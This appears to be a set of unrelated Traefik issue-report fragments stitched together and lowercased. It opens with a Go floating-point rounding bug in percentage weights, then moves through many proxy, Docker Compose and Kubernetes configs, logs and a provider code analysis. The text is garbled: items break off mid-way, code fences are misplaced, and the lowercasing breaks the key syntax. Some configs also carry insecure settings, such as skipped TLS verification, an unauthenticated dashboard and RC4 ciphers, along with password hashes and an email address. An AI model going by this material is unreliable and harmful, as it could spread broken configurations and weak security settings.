#l46 func newpercentagevaluefromfloat64(f float64) percentagevalue { return percentagevalue(f * (1000 * 100))
} i have put a example here in go playground too
```
func main(){ fmt.println(newpercentagevaluefromfloat64(39.1)) fmt.println(newpercentagevaluefromfloat64(39.2)) fmt.println(newpercentagevaluefromfloat64(39.3))
3929.999% ``` f = 39.3
f * (1000) = 39300
f * (10000) = 393000
f * (100000) = 3.9299999999999995e+06 // now this is what has been done in code and it failed in my case!! magic of floating point arithmetic !!!! ### what percentage of distribution is not working in my view i have tested few of the below percentage and this is happening cause of floating point arithmetics done by go code
following percentage are broken!!! ```
2.3, 4.1, 4.6, 5.1, 8.2, 8.7, 9.2, 9.7, 10.2, 16.4, 16.9, 17.4, 17.9, 18.4, 18.9, 19.4, 19.9, 20.4, 20.9, 32.3, 32.8, 33.3, 33.8, 34.3, 34.8, 35.3, 35.8, 36.3, 36.8, 37.3, 37.8, 38.3, 38.8, 39.3, 39.8, 40.3, 40.8, 41.3, 41.8, 64.1, 64.6, 65.1, 65.6, 66.1, 66.6, 67.1, 67.6, 68.1, 68.6, 69.1, 69.6, 70.1, 70.6, 71.1, 71.6, 72.1, 72.6, 73.1, 73.6, 74.1, 74.6, 75.1, 75.6, 76.1, 76.6, 77.1, 77.6, 78.1, 78.6, 79.1, 79.6, 80.1,
80.6, 81.1, 81.6, 82.1, 82.6, 83.1, 83.6,
xeon e3 1240l v3 / 16gb / ubuntu server 16.04 / docker docker-compose.yml:
version: \'2\' services: traefik: image: traefik:v2.0 ports: - "80:80" - "443:443" volumes: - /var/run/docker.sock:/var/run/docker.sock - /storage/docker/traefik/acme.json:/etc/traefik/acme/acme.json - /storage/docker/traefik/traefik.toml:/etc/traefik/traefik.toml - /storage/docker/traefik/dynamic.toml:/etc/traefik/dynamic.toml - /etc/letsencrypt/live/gofferje.net/fullchain.pem:/etc/traefik/gn_fullchain.pem - /etc/letsencrypt/live/gofferje.net/privkey.pem:/etc/traefik/gn_privkey.pem networks: - web_services networks: web_services: external: name: web_services ``` traefik.toml (excerpt):
[providers.docker] exposedbydefault = false [providers.file] filename = "/etc/traefik/dynamic.toml" watch = true
kubernetescrd provider
simple ingressroute+middleware:
apiversion: traefik.containo.us/v1alpha1
kind: ingressroute
metadata: name: ingressroute-graphql namespace: default
spec: entrypoints: - http routes: - match: host(`my.domain`) && pathprefix(`/`) kind: rule services: - name: graphql-http port: 80 priority: 12 middlewares: - name: cors-all
apiversion: traefik.containo.us/v1alpha1
kind: middleware
metadata: name: cors-all namespace: default
spec: headers: accesscontrolallowmethods: - "get" - "options" - "put" - "post" accesscontrolalloworigin: "origin-list-or-null" accesscontrolmaxage: 100 accesscontrolallowheaders: - "content-type" addvaryheader: "true"
```toml ```
traefik is running in k8s as a deployment with the kubernetescrd provider, on coreos stable
- name: traefik image: traefik:v2.0 imagepullpolicy: always args: - --api - --api.dashboard=true - --api.insecure=true - --entrypoints.http.address=:80 - --entrypoints.https.address=:443 - --metrics.prometheus=true - --providers.kubernetescrd - --certificatesresolvers.default.acme.tlschallenge=true - --certificatesresolvers.default.acme.email=<retracted> - --certificatesresolvers.default.acme.httpchallenge.entrypoint=http - --certificatesresolvers.default.acme.storage=/acme.json
i've created a minimal example using [flask-socketio]( example and forced it to use a websocket transport
the repo for it is [here](
accessing the app directly (`:5000`) or through traefik's http route (`:80`) works fine, but accessing it through traefik's https route (`:443`) gets stuck where it appears to upgrade and then immediately drops the connection.
# traefik.toml [global] checknewversion = true sendanonymoususage = false [entrypoints] [entrypoints.web] address = ":80" [entrypoints.web-secure] address = ":443" [entrypoints.postgres] address = ":5432" [certificatesresolvers.letsencrypt.acme] email = "admin@example.co" storage = "/etc/letsencrypt/acme.json" #caserver = " " [certificatesresolvers.letsencrypt.acme.dnschallenge] provider = "cloudflare" delaybeforecheck = 0 resolvers = ["jim.ns.cloudflare.com:53", "lia.ns.cloudflare.com:53"] [api] dashboard = true [ping] [metrics] [metrics.prometheus] [providers] [providers.docker] endpoint = "unix:///var/run/docker.sock" defaultrule = "host(`{{ normalize .name }}.example.com`)" watch = true exposedbydefault = false [providers.file] watch = true directory = "/etc/traefik/config"
``` here is my jira ansible role with traefik labels: ```yml
- name: create jira container docker_container: name: jira image: cptactionhank/atlassian-jira restart_policy: unless-stopped pull: yes volumes: - /opt/apps/jira:/var/atlassian/jira labels: traefik.enable: "true" traefik.http.middlewares.jira_limit.buffering.maxrequestbodybytes: "10000000" traefik.http.routers.jira_https.entrypoints: web-secure traefik.http.routers.jira_https.middlewares: jira_limit traefik.http.routers.jira_https.rule: "host(`{{ jira_fqdn }}`)" traefik.http.routers.jira_https.tls: "true" traefik.http.routers.jira_https.tls.certresolver: letsencrypt traefik.http.routers.jira_https.tls.domains[0].main: "{{ jira_fqdn }}" traefik.http.routers.jira_https.service: jira traefik.http.services.jira.loadbalancer.server.port: "8080" env: x_proxy_name: "{{ jira_fqdn }}" x_proxy_scheme: https
``` proxy: image: traefik:v2.0.0 ports: - 55555:8080 command: - --global.checknewversion=false - --global.sendanonymoususage=false - --accesslog - --api - --api.insecure - --ping - --entrypoints.http.address=:80 - --providers.docker.endpoint=tcp://daemon:2375 - --providers.docker.exposedbydefault=false - --providers.docker.swarmmode=true - --providers.docker.network=intranet - "--providers.docker.constraints=label(`intranet`, `true`)" - \'--providers.docker.defaultrule=host(`i.trajano.net`) && pathprefix(`/{{ .name | trimprefix (index .labels "com.docker.stack.namespace") | trimprefix "_" }}`)\' - --providers.file.filename=/traefik-conf.toml - --tracing.zipkin.httpendpoint= healthcheck: test: traefik healthcheck --ping deploy: replicas: 1 update_config: order: start-first restart_policy: condition: any delay: 10s environment: - tz=america/toronto volumes: - /d/p/trajano.net/traefik.toml:/traefik-conf.toml networks: - intranet - internal - management
``` config is not really relevant but here you go
[tls.options] [tls.options.default] minversion = "versiontls12" ciphersuites = [ "tls_ecdhe_rsa_with_aes_128_gcm_sha256", "tls_ecdhe_rsa_with_aes_256_gcm_sha384", "tls_ecdhe_rsa_with_chacha20_poly1305", "tls_aes_128_gcm_sha256", "tls_aes_256_gcm_sha384", "tls_chacha20_poly1305_sha256" ] snistrict = true [tls.options.mintls13] minversion = "versiontls13" [http.middlewares] [http.middlewares.compress-all.compress] [http.middlewares.https-only.redirectscheme] scheme = "https" permanent = true [http.middlewares.security-headers.headers] browserxssfilter = true contenttypenosniff = true forcestsheader = true framedeny = true sslredirect = true stsincludesubdomains = true stspreload = true stsseconds = 315360000 [http.middlewares.strip-prefix.chain] middlewares = [ "strip-prefix-1", "strip-prefix-2"] [http.middlewares.strip-prefix-1.redirectregex] regex="^(https?://[^/]+/[a-z0-9_]+)$" replacement="${1}/" permanent = true [http.middlewares.strip-prefix-2.stripprefixregex] regex = [ "/[a-z0-9_]+" ] ```
this is a docker image traefik:v2.0 in a docker swarm of docker 18.06.1-ce
docker provider
kubernetes 1.16, risc-v architecture
```toml [entrypoints] [entrypoints.web] address = ":80" [entrypoints.web-secure] address = ":443" [log] level = "debug" [accesslog] [serverstransport] insecureskipverify = true [api] insecure = true [ping] [providers.kubernetesingress] [metrics] [metrics.prometheus] buckets=[0.1,0.3,1.2,5.0]
running docker 19.x in swarm mode
community post here:
** platform traefik is running on **
distrib_id=ubuntu
distrib_release=16.04
distrib_codename=xenial
distrib_description="ubuntu 16.04.4 lts"
name="ubuntu"
version="16.04.4 lts (xenial xerus)"
id_like=debian
pretty_name="ubuntu 16.04.4 lts"
version_id="16.04"
home_url=" "
support_url=" "
bug_report_url=" "
version_codename=xenial
ubuntu_codename=xenial
``` ** static config **
loglevel = "info"
defaultentrypoints = ["https"]
[entrypoints] [entrypoints.http] address = ":80" compress = true [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" compress = true minversion = "versiontls12" ciphersuites = [ "tls_rsa_with_rc4_128_sha", "tls_rsa_with_aes_128_cbc_sha", "tls_rsa_with_aes_256_cbc_sha", "tls_rsa_with_aes_128_cbc_sha256", "tls_rsa_with_aes_128_gcm_sha256", "tls_rsa_with_aes_256_gcm_sha384", "tls_ecdhe_ecdsa_with_rc4_128_sha", "tls_ecdhe_ecdsa_with_aes_128_cbc_sha", "tls_ecdhe_ecdsa_with_aes_256_cbc_sha", "tls_ecdhe_rsa_with_rc4_128_sha", "tls_ecdhe_rsa_with_3des_ede_cbc_sha", "tls_ecdhe_rsa_with_aes_128_cbc_sha", "tls_ecdhe_rsa_with_aes_256_cbc_sha", "tls_ecdhe_ecdsa_with_aes_128_cbc_sha256", "tls_ecdhe_rsa_with_aes_128_cbc_sha256", "tls_ecdhe_rsa_with_aes_128_gcm_sha256", "tls_ecdhe_ecdsa_with_aes_128_gcm_sha256", "tls_ecdhe_rsa_with_aes_256_gcm_sha384", "tls_ecdhe_ecdsa_with_aes_256_gcm_sha384", "tls_ecdhe_rsa_with_chacha20_poly1305", "tls_ecdhe_ecdsa_with_chacha20_poly1305" ] [entrypoints.https.tls] [[entrypoints.https.tls.certificates]] certfile = "<certfile>" keyfile = "<keyfile>" [entrypoints.foo] address = ":8080" [entrypoints.foo.auth] [entrypoints.foo.auth.basic] users = [ "admin:$apr1$q3adbzcc$bc6sde79ppgyxivyj.we1." ]
[traefiklog] filepath = "/opt/traefik/log/traefik.log" format = "json"
[accesslog] filepath = "/opt/traefik/log/access.log" format = "json" bufferingsize = 1000 [accesslog.fields] defaultmode = "drop" [accesslog.fields.names] "backendaddr" = "keep" "clientaddr" = "keep" "downstreamstatus" = "keep" "originduration" = "keep" "originstatus" = "keep" "overhead" = "keep" "requestaddr" = "keep" "requestmethod" = "keep" "requestpath" = "keep" "requestprotocol" = "keep" "retryattempts" = "keep" "startutc" = "keep" [accesslog.fields.headers] defaultmode = "drop" [accesslog.fields.headers.names] "trace-id" = "keep"
[api] entrypoint="foo"
[file] filename="/opt/traefik/runtime.toml" watch = true
``` ** runtime config **
[backends] [backends.backend] [backends.backend.loadbalancer] method = "wrr" [backends.backend.healthcheck] path = "/health" interval = "10s" [backends.backend.servers.server1] url = " fqdn>" weight = 1 [backends.backend.servers.server2] url = " fqdn>" weight = 1 [frontends] [frontends.frontend1] backend = "backend" entrypoints = ["https"] [frontends.frontend1.routes.test_1] rule = "path:/health,/provision/bulk,/identity" [frontends.frontend2] backend = "backend" entrypoints = ["https"] [frontends.frontend2.routes.test_1] rule = "pathprefix:/v1/,/v1.1/,/v1.2/"
```
```toml ```
version: '2'
services: proxy: image: traefik:v1.7.14 cpu_shares: 3072 mem_limit: 256mb memswap_limit: 512mb read_only: true depends_on: - dockersocket security_opt: - label=level:s0:c100 ports: - "80:80" - "443:443" volumes: - "/var/srv/traefik/acme:/etc/traefik/acme" command: "-c /dev/null --docker --docker.endpoint=tcp://dockersocket:2375 --acme --acme.email=<redacted> --acme.storage=/etc/traefik/acme/acme.json --acme.entrypoint=https --acme.onhostrule --acme.dnsprovider=cloudflare --acme.dnschallenge --entrypoints=\'name:http address::80 redirect.entrypoint:https\' --entrypoints=\'name:https address::443 compress:true tls\' --defaultentrypoints=http,https --docker.exposedbydefault=false --insecureskipverify=true"
``` i don't use an additional toml file for configuration
i have an idea where it might comes from: at least this seems to be the latest change to the tls code which might lead to autodetected sslv3 support? as there is a cipher overlap between tls1.0 and sslv3 around `tls_rsa_with_aes_128_cbc_sha`, `tls_rsa_with_aes_256_cbc_sha` and `tls_rsa_with_3des_ede_cbc_sha`
additional hint: i verified that just by changing the image version back to 1.7.13 the rating went back to a+ and sslv3 was disabled.
using traefik as standalone on a debian 10 platform
backend is also non-docker
file-based config: ````yaml
http: routers: myroute: entrypoints: ['https'] service: myservice rule: host(`service.example.com`) services: myservice: loadbalancer: servers: - url:
`traefic.toml`
[providers.file] filename = "config.toml" [certificatesresolvers.domain.acme] email = "email@address.com" storage = "acme.json" keytype = "ec256" acmelogging = true [certificatesresolvers.domain.acme.dnschallenge] provider = "cloudflare" resolvers = ["1.1.1.1:53", "8.8.8.8:53"]
`config.toml`
[http.routers.traefik] rule = "host(`traefik.domain.com`)" middlewares = ["default","auth"] service = "traefik" [http.routers.traefik.tls] options = "default" certresolver = "domain" [[http.routers.traefik.tls.domains]] main = "*.domain.com" sans = ["domain.com"]
[http.routers.site] rule = "host(`site.domain.com`)" middlewares = ["default"] service = "site" [http.routers.site.tls] options = "default" certresolver = "domain" [[http.routers.site.tls.domains]] main = "*.domain.com" sans = ["domain.com"]
```toml # traefik.toml [global] checknewversion = true [log] level = "info" format = "json" [entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.proxyprotocol] trustedips = ["192.168.128.0/18"] [entrypoints.https] address = ":443" [entrypoints.https.proxyprotocol] trustedips = ["192.168.128.0/18"] [api] dashboard = true [ping] [providers] [providers.kubernetescrd] [certificatesresolvers] [certificatesresolvers.defaultresolver] [certificatesresolvers.defaultresolver.acme] keytype = "rsa4096" email = "tomfun1990@gmail.com" storage = "/acme/acme_2.json" [certificatesresolvers.defaultresolver.acme.dnschallenge] provider = "route53"
i'm using docker and docker-compose
version: "3.3" services: traefik: image: "traefik:v2.0" container_name: "traefik" command: #- "--log.level=debug" - "--api=true" - "--providers.docker=true" - "--providers.docker.exposedbydefault=false" # - "--entrypoints.web.address=:80" ports: - "80:80" - "8080" volumes: - "/var/run/docker.sock:/var/run/docker.sock:ro" labels: - "traefik.enable=true" - "traefik.http.routers.traefik.rule=host(`dash.localhost`)" - "traefik.http.middlewares.traefik.basicauth.users=admin:$$apr1$$gzj6gdsv$$lzq4xl4vhehrtwhay3jfc." - "traefik.http.services.traefik.loadbalancer.server.port=8080" whoami: # a container that exposes an api to show its ip address image: containous/whoami labels: - "traefik.enable=true" - "traefik.http.routers.whoami.rule=host(`whoami.localhost`)" liker: image: "rezam/grpc-test" container_name: "grpc-test" labels: - "traefik.enable=true" - "traefik.http.routers.grpc-test.rule=host(`grpc.localhost`)" - "traefik.http.services.grpc-test.loadbalancer.server.scheme=h2c"
i run `docker-compose up -d`
ubuntu 18.04.1
traefikee v1.1.9
k3s with default traefik helm install removed with:
`kubectl delete -n kube-system helmcharts traefik`
docker provider is used, labels:
```yaml labels: - "traefik.docker.network=web" - "traefik.enable=true" - "traefik.http.routers.stuffhttps.rule=host(`domain`) || host(`domain2`)" - "traefik.http.routers.stuffhttps.entrypoints=https" - "traefik.http.routers.stuffhttps.tls.certresolver=default" - "traefik.http.routers.stuffhttps.middlewares=sec@file" - "traefik.http.routers.stuffhttp.middlewares=redirect" - "traefik.http.routers.stuffhttp.rule=host(`domain`) || host(`domain2`)" - "traefik.http.routers.stuffhttp.entrypoints=http" - "traefik.http.middlewares.redirect.headers.sslredirect=true" - "traefik.http.services.stuff.loadbalancer.healthcheck.path=/health/health" - "traefik.http.services.stuff.loadbalancer.healthcheck.interval=15s" - "traefik.http.services.stuff.loadbalancer.healthcheck.timeout=1s"
``` nginx log example: ```
172.29.0.3 - - [20/aug/2019:06:08:14 +0000] "get /health/health http/1.1" 404 153 "-" "go-http-client/1.1" "-" 2019/08/20 06:08:29 [error] 6#6: *89 open() "/usr/share/nginx/html/health/health" failed (2: no such file or directory), client: 172.29.0.3, server: localhost, request: "get /health/health http/1.1", host: "172.29.0.6:80"
[global] checknewversion = false sendanonymoususage = true [log] level = "debug" format = "common" [ping] [api] dashboard = true debug = true [entrypoints] [entrypoints.git] address = ":22" [entrypoints.http] address = ":80" [entrypoints.https] address = ":443" [certificatesresolvers] [certificatesresolvers.prod] [certificatesresolvers.prod.acme] email = "myemail@domain.tld" storage = "/etc/traefik/ssl/acme.json" keytype = "rsa4096" caserver = " " [certificatesresolvers.prod.acme.dnschallenge] provider = "azure" delaybeforecheck = 0 disablepropagationcheck = true
```
global: checknewversion: true sendanonymoususage: false
serverstransport: insecureskipverify: true
providers: docker: endpoint: "unix:///var/run/docker.sock" exposedbydefault: false
entrypoints: websecure: address: ":443"
certificatesresolvers: cloudflare: acme: email: "xxx" storage: "/etc/traefik/acme.json" dnschallenge: provider: cloudflare
``` docker labels:
```yaml - "traefik.enable=true" - "traefik.http.routers.plex.rule=host(`plex.${tld}`)" - "traefik.http.routers.plex.entrypoints=websecure" - "traefik.http.routers.plex.tls.options=default@file" - "traefik.http.routers.plex.tls.certresolver=cloudflare"
```
* running traefik in docker with discovery via the socket
* http to https redirection is configured in `traefik.toml` ```toml
defaultentrypoints = ["https"] [entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" [entrypoints.https.tls] [docker]
kubectl get ingress phpmyadmin -o yaml
apiversion: extensions/v1beta1
kind: ingress
metadata: annotations: external-dns.alpha.kubernetes.io/hostname: phpmyadmin.dev.example.com
flux.weave.works/antecedent: default:helmrelease/phpmyadmin ingress.kubernetes.io/auth-response-headers: x-userinfo,x-id-token,x-access-token,authorization ingress.kubernetes.io/auth-type: forward ingress.kubernetes.io/auth-url: ingress.kubernetes.io/rewrite-target: / kubernetes.io/ingress.class: traefik kubernetes.io/tls-acme: "true" nginx.ingress.kubernetes.io/rewrite-target: / traefik.ingress.kubernetes.io/frontend-entry-points: http,https traefik.ingress.kubernetes.io/redirect-entry-point: https creationtimestamp: "2019-08-08t10:44:26z" generation: 1 labels: app: phpmyadmin chart: phpmyadmin-3.0.0 heritage: tiller release: phpmyadmin name: phpmyadmin namespace: default resourceversion: "41545342" selflink: /apis/extensions/v1beta1/namespaces/default/ingresses/phpmyadmin uid: 7ddf1cb9-b9c9-11e9-9b97-028d657381ca
spec: rules: - http: paths: - backend: servicename: phpmyadmin serviceport: http path: / tls: - hosts: - phpmyadmin.dev.example.com secretname: phpmyadmin-dev-example-example-com-tls
config.toml
[entrypoints] [entrypoints.web] address = ":80" [entrypoints.traefik] address = ":8100" [api] [log] level = "debug" [providers.file] filename = "dynamic_conf.toml"
dynamic_conf.toml
[http] [http.routers] [http.routers.routertest] service = "srv-grpc" rule = "host(`frontend.local`)" [http.services] [http.services.srv-grpc] [http.services.srv-grpc.loadbalancer] [[http.services.srv-grpc.loadbalancer.servers]] url = "h2c://backend.local:10000"
the "kubernetesingress" provider is active
### detailed problem analysis let's review the first _ingress_ inspection predicate, as written for the previous version of traefik:
> if the service port defined in the ingress spec is 443 (note that you can still use `targetport` to use a different port on your pod) at present, [the documentation for traefik version 2\'s "kubernetesingress" provider]( makes no such promise, but the code is adapted from the earlier version of traefik, and [is clearly trying to implement this promise]( #l216-l228)
in file _pkg/provider/kubernetes/ingress/kubernetes.go_, rather than inspecting [the `endpointport.port` field]( #l4133-l4134) at [line 228]( #l228), we should instead inspect [the `serviceport.port` field]( #l3928-l3929), available in function `loadservice` as the expression `portspec.port`
in other words, line 228 could read as follows:
if portspec.port == 443 || strings.hasprefix(portname, "https") {
that\'s still not addressing taking the "ingress.kubernetes.io/protocol" annotation into account, but it\'s an improvement
the test fixtures don't capture this case
the one that exercises this port 443 detection uses [a kubernetes _service_ whose service port is equivalent to its target port]( #l9)
note that this same problem afflicts the "kubernetescrd" provider in file _pkg/provider/kubernetes/crd/kubernetes.go_, in the similarly named `loadservers` function [here]( #l285-l287).
--api.dashboard
--entrypoints=name:http address::80
--entrypoints=name:https address::443 tls
--metrics.prometheus
--defaultentrypoints=http,https
--insecureskipverify=true
--docker.swarmmode
--docker.swarmmoderefreshseconds=5
--docker.domain=our.domain.com
--docker.watch
--accesslog
--accesslog.format=json
--accesslog.fields.headers.defaultmode=redact
--lifecycle.gracetimeout=10s
``` ### if applicable, please paste the log output at debug level (`--log.level=debug` switch) some pprof files just before crash (~900mb memory used)
[perfs.tar.gz](
i don't have a config file
here is the cmd that is being run in the docker container:
/traefik --api --docker --defaultentrypoints=https --entrypoints=name:https address::443 tls:/certs/path --entrypoints=name:http address::80 redirect.entrypoint:https --respondingtimeouts.writetimeout=24h
frontend / backends configured via usual k8s annotations..
just simple hostname rules.
deployment with default helm chart.
``` ``` [entrypoints.https] address = ":443" compress = true [entrypoints.https.tls] minversion = "versiontls12" ciphersuites = [ "tls_ecdhe_ecdsa_with_aes_256_gcm_sha384", "tls_ecdhe_rsa_with_aes_256_gcm_sha384", "tls_ecdhe_ecdsa_with_chacha20_poly1305", "tls_ecdhe_rsa_with_chacha20_poly1305", "tls_ecdhe_ecdsa_with_aes_128_gcm_sha256", "tls_ecdhe_rsa_with_aes_128_gcm_sha256", "tls_ecdhe_ecdsa_with_aes_128_cbc_sha256", "tls_ecdhe_rsa_with_aes_128_cbc_sha256" ] [[entrypoints.https.tls.certificates]] certfile = "{{ traefik_cert_dir }}/{{ traefik_domain }}.pem" keyfile = "{{ traefik_cert_dir }}/{{ traefik_domain }}.key" [entrypoints.https.tls.clientca] files = ["{{ traefik_cert_dir }}/ca.pem"] optional = true [entrypoints.https.forwardedheaders] trustedips = ["127.0.0.1/32", "xxx.yyy.zzz.aaa", "xxx.yyy.zzz.aaa", "xxx.yyy.zzz.aaa", "xxx.yyy.zzz.aaa"] [entrypoints.https.proxyprotocol] trustedips = ["127.0.0.1/32", "xxx.yyy.zzz.aaa", "xxx.yyy.zzz.aaa", "xxx.yyy.zzz.aaa", "xxx.yyy.zzz.aaa"]
we are running on docker swarm
output of `docker version`: ```
client: version: 18.09.6 api version: 1.39 go version: go1.10.8 git commit: 481bc77 built: sat may 4 02:36:00 2019 os/arch: linux/amd64 experimental: false server: docker engine - community engine: version: 18.09.6 api version: 1.39 (minimum version 1.12) go version: go1.10.8 git commit: 481bc77 built: sat may 4 01:59:36 2019 os/arch: linux/amd64 experimental: false ``` extract from our configuration, which is stored in consul with the `storeconfig` command: ```toml
entrypoints = [\'https\', "http"]
endpoint="unix://var/run/docker.sock"
swarmmode=true [consul]
endpoint = "consul:8500"
prefix = "traefik" [acme]
storage= "traefik/acme/account"
caserver = " "
onhostrule = true
ondemand = false
email = "(redacted)"
entrypoint = "https"
[acme.dnschallenge] provider = "route53"
```
kind: deployment
apiversion: extensions/v1beta1
metadata: namespace: default name: traefik labels: app: traefik spec: replicas: 1 selector: matchlabels: app: traefik template: metadata: labels: app: traefik spec: serviceaccountname: traefik-ingress-controller containers: - name: traefik image: traefik:v2.0 args: - --api - --accesslog - --entrypoints.web.address=:8000 - --entrypoints.websecure.address=:4443 - --providers.kubernetescrd - --providers.kubernetescrd.ingressclass="traefik" - --acme - --acme.acmelogging - --acme.tlschallenge - --acme.onhostrule - --acme.email=foo@you.com - --acme.entrypoint=websecure - --acme.storage=acme.json # please note that this is the staging let\'s encrypt server
# once you get things working, you should remove that whole line altogether
- --acme.caserver= ports: - name: web containerport: 8000 - name: websecure containerport: 4443 - name: admin containerport: 8080
kind: clusterrole
apiversion: rbac.authorization.k8s.io/v1beta1
metadata: name: traefik-ingress-controller
rules: - apigroups: - "" resources: - services - endpoints - secrets verbs: - get - list - watch - apigroups: - extensions resources: - ingresses verbs: - get - list - watch - apigroups: - extensions resources: - ingresses/status verbs: - update - apigroups: - traefik.containo.us resources: - middlewares verbs: - get - list - watch - apigroups: - traefik.containo.us resources: - ingressroutes verbs: - get - list - watch - apigroups: - traefik.containo.us resources: - ingressroutetcps verbs: - get - list - watch
### fixes the tlsoptions bug - apigroups: - traefik.containo.us resources: - tlsoptions verbs: - get - list - watch ---
kind: clusterrolebinding
apiversion: rbac.authorization.k8s.io/v1beta1
metadata: name: traefik-ingress-controller
roleref: apigroup: rbac.authorization.k8s.io kind: clusterrole name: traefik-ingress-controller
subjects: - kind: serviceaccount name: traefik-ingress-controller namespace: nefle - kind: serviceaccount name: traefik-ingress-controller namespace: default
since we use kubernetes, we use the `file` provider only with [this config]( via a configmap
we store the acme state in etcd.
defaultentrypoints = ["http"] #############
#debug = true
############# [docker]
watch = true
swarmmode = true
exposedbydefault = false
network = "public" [docker.tls]
ca = "/run/secrets/ucp/ca.pem"
cert = "/run/secrets/ucp/cert.pem"
key = "/run/secrets/ucp/key.pem"
insecureskipverify = true [entrypoints] [entrypoints.http] address = ":80" [entrypoints.api] address = ":8080" [entrypoints.api.auth] [entrypoints.api.auth.basic] users = [ "admin:*snip*" ] [entrypoints.metrics] address = ":8081" [entrypoints.ping] address = ":8082" [api]
entrypoint = "api" [metrics] [metrics.prometheus] entrypoint = "metrics" [ping]
entrypoint = "ping" [accesslog]
format = "json"
the docker ucp manage endpoint gets passed with the traefik startup.
`--docker.endpoint=tcp://<ucp-manager-dns-alias>:8443`
**static config:**
[entrypoints] [entrypoints.web] address = ":80" [entrypoints.secure] address = ":443" [entrypoints.api] address = ":8080" [providers] [providers.docker] endpoint = "unix:///var/run/docker.sock" [providers.file] watch = true filename = "/config/dynamic/traefik_dynamic.toml"
``` **dynamic config:**
[providers.file] [http] [http.routers] [http.routers.router0] entrypoints = ["web"] service = "docker.whoami_composeprojectname" # this service is required, even though it\'s never used by the router rule = "host(`test.localhost`)" middlewares=["tls_redirect"] [http.routers.router1] entrypoints = ["secure"] service = "docker.whoami_composeprojectname" rule = "host(`test.localhost`)" [http.routers.router1.tls] [http.middlewares] [http.middlewares.tls_redirect.redirectscheme] scheme = "https"
``` **docker-compose.yml:**
version: \'3\' services: reverse-proxy: image: traefik:v2.0 ports: - "80:80" - "443:443" - "8080:8080" volumes: - /var/run/docker.sock:/var/run/docker.sock - $pwd/config/traefik_static.toml:/etc/traefik/traefik.toml - $pwd/config/dynamic/:/config/dynamic/ networks: mynetwork: aliases: - proxy.docker.localhost whoami: image: containous/whoami container_name: whoami labels: - "traefik.http.routers.whoami.rule=host(`whoami.localhost`)" networks: mynetwork: aliases: - whoami.docker.localhost networks: mynetwork: driver: bridge
#### deployment ```yaml
apiversion: extensions/v1beta1
kind: deployment
metadata: annotations: deployment.kubernetes.io/revision: "6" creationtimestamp: null generation: 1 labels: app: default-http-backend name: default-http-backend selflink: /apis/extensions/v1beta1/namespaces/production/deployments/default-http-backend
spec: progressdeadlineseconds: 2147483647 replicas: 1 revisionhistorylimit: 10 selector: matchlabels: app: default-http-backend strategy: rollingupdate: maxsurge: 1 maxunavailable: 1 type: rollingupdate template: metadata: creationtimestamp: null labels: app: default-http-backend spec: containers: - image: nginx:1.13.0 imagepullpolicy: ifnotpresent name: nginx ports: - containerport: 80 name: server protocol: tcp readinessprobe: failurethreshold: 3 httpget: path: /ping port: 80 scheme: http periodseconds: 10 successthreshold: 1 timeoutseconds: 1 resources: limits: cpu: 10m requests: cpu: 10m terminationmessagepath: /dev/termination-log terminationmessagepolicy: file volumemounts: - mountpath: /usr/share/nginx/html/404.html name: config readonly: true subpath: 404.html - mountpath: /etc/nginx/nginx.conf name: config readonly: true subpath: nginx.conf - args: - -nginx.scrape_uri= image: fish/nginx-exporter:v0.1.0 imagepullpolicy: ifnotpresent name: exporter ports: - containerport: 9113 name: exporter protocol: tcp resources: limits: cpu: 10m requests: cpu: 10m terminationmessagepath: /dev/termination-log terminationmessagepolicy: file dnspolicy: clusterfirst restartpolicy: always schedulername: default-scheduler securitycontext: {} terminationgraceperiodseconds: 30 volumes: - configmap: defaultmode: 420 name: default-http-backend name: config
``` #### service ```yaml
apiversion: v1
kind: service
metadata: annotations: prometheus.io/port: "9113" prometheus.io/probe: "true" prometheus.io/probemodule: http_2xx prometheus.io/scheme: http prometheus.io/scrape: "true" creationtimestamp: null name: default-http-backend selflink: /api/v1/namespaces/production/services/default-http-backend
spec: externaltrafficpolicy: cluster ports: - name: http port: 80 protocol: tcp targetport: 80 - name: exporter port: 9113 protocol: tcp targetport: 9113 selector: app: default-http-backend sessionaffinity: none type: nodeport
status: loadbalancer: {}
we use fargate with the following parameters: ``` - !sub --dynamodb.tablename=${productname}-traefik - !sub --dynamodb.region=${aws::region} - --dynamodb.debugloggeneratedtemplate=true - --dynamodb.trace=true
``` the entry within dynamodb is set using python
it has this record for the front-end item: ``` item={ "id": "es-frontend", "name": "elasticsearch-frontend", "frontend": { "backend": "elasticsearch-backend", "routes": { "subdomains": { "rule": "hostregexp:{subdomain:search.*}" } }, "auth": { "basic": { "users": [ "xxx:$apr1$m1xce2g0$k8z /8rxw/" ], "removeheader": true } } } }
``` (password is irrelevant, it has already been changed)
shown above.
`traefik/config/traefik.toml` ```toml
[api] [entrypoints] [entrypoints.traefik] address = ":8880" [entrypoints.redis-port] address = ":6379" [global] debug = true [log] format = "json" loglevel = "debug" [providers] [providers.docker] defaultrule = "host(`{{ normalize .name }}.docker.localhost`)" endpoint = "unix:///var/run/docker.sock" watch = true
``` `traefik/docker-compose.yaml` ```yaml
version: '3'
services: proxy: container_name: reverse-proxy image: traefik:v2.0-alpine networks: - shared_infrastructure ports: - "6379:6379" - "8880:8880" volumes: - /var/run/docker.sock:/var/run/docker.sock - ./config/traefik.toml:/etc/traefik/traefik.toml:ro
networks: shared_infrastructure: external: true
``` `redis/docker-compose.yaml`
version: '3'
services: redis: container_name: redis image: redis:4-alpine networks: - shared_infrastructure labels: - "traefik.docker.network=shared_infrastructure" - "traefik.tcp.routers.redis.entrypoints=redis-port" - "traefik.tcp.routers.redis.rule=hostsni(`*`)" - "traefik.tcp.services.redis.loadbalancer.server.port=6379" ports: - "6379" restart: always
networks: shared_infrastructure: external: true
``` `/api/rawdata` ```json
{ "docker": { "http": { "routers": { "proxy_traefik": { "entrypoints": null, "service": "proxy_traefik", "rule": "host(`proxy-traefik.docker.localhost`)" } }, "services": { "proxy_traefik": { "loadbalancer": { "servers": [ { "url": " ", "weight": 1 } ], "method": "wrr", "passhostheader": true } } } }, "tcp": { "routers": { "redis": { "entrypoints": [ "redis-port" ], "service": "redis_redis", "rule": "hostsni(`*`)" } }, "services": { "redis_redis": { "loadbalancer": { "servers": [ { "address": "172.18.0.2:6379", "weight": 1 } ], "method": "wrr" } } } }, "tlsoptions": null, "tlsstores": null }
simple reproduction case, with a frontend on the api itself for the sake of simplicity:
(username is `user` and password is `password`) ```yml
